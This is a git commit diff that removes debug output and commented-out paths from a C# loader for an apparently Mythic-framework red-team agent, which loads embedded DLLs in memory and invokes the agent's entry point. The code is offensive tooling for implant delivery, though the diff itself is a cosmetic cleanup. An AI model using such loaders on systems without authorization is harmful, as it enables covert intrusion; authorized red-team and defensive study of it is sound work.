896c0be327eb8ab71ec6372f28e85c8a13fcb3fc
checkymander <checkymander@protonmail.com>
2024-11-03 20:31:25 -0500

    removed old comments

--- Payload_Type/aegis/aegis/agent_code/Aegis/Aegis.Loader.Plaintext/AgentLoader.cs
+++ Payload_Type/aegis/aegis/agent_code/Aegis/Aegis.Loader.Plaintext/AgentLoader.cs
@@ -12,14 +12,12 @@ namespace Aegis.Loader
         }
         public async Task Load()
         {
-
             List<string> excludedDlls = new List<string>() {"Agent.dll","Agent.Models.dll" };
             var alc = AssemblyLoadContext.Default;
             var asmExe = Assembly.GetExecutingAssembly();
 
             if (asmExe == null)
             {
-                Console.WriteLine("Null1");
                 return;
             }
 
@@ -28,7 +26,6 @@ namespace Aegis.Loader
 
             if (modelStream == null)
             {
-                Console.WriteLine("Null2");
                 return;
             }
 
@@ -48,25 +45,12 @@ namespace Aegis.Loader
                     alc.LoadFromStream(s);
                 }
             }
-            //Assembly asm = alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Models.dll");
-            //Console.WriteLine(asm.FullName);
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Crypto.Aes.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Managers.Windows.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Autofac.Extensions.DependencyInjection.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Microsoft.Extensions.DependencyInjection.Abstractions.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Managers.Reflection.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Agent.Profiles.HTTP.dll");
-            //alc.LoadFromAssemblyPath("C:\\Users\\scott\\Downloads\\athena (1)\\Autofac.dll");
 
-
-            // Load the assembly
-            //Assembly assembly = alc.LoadFromAssemblyPath("C:\\Users\\scott\\source\\repos\\MythicAgents\\Athena\\Payload_Type\\athena\\athena\\agent_code\\Agent\\bin\\LocalDebugDiscord\\net7.0\\Agent.dll");
             // Get the entry point method
             Stream ad = asmExe.GetManifestResourceStream("Aegis.Loader.Plaintext.Agent.dll");
             Assembly agent;
             if (ad == null)
             {
-                Console.WriteLine("Null4");
                 return;
             }
             agent = alc.LoadFromStream(ad);
@@ -74,7 +58,6 @@ namespace Aegis.Loader
 
             // Invoke the entry point method
             object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
-            Console.WriteLine("Executing Agent.");
             entryPoint.Invoke(null, null);
         }
     }
